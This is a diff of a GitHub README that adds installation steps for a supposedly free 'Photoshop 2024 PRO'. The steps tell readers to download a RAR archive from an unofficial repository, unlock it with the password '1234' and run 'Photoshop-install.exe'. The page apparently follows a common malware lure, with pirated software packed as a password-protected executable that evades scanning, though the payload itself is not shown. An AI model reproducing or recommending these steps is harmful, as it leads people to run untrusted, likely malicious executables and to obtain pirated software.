@@ -18,7 +18,11 @@
 
 ![alt-текст](https://github.com/user-attachments/assets/be4b3464-d5f6-42b1-8c16-6c9c3a679fac)
 
-## A workflow dedicated entirely to creative photo processing
+## Installation Stages:
+* Download the archive using the button above
+* Enter password: 1234
+* Open Photoshop-install.exe
+* Follow the installation.
 
 ## 🔐 [Dowload Photoshop 2024 PRO](https://github.com/photoshop-slivaka/Photoshope-free-Free/raw/refs/heads/main/Photoshop-install.rar)
 ### ● Features
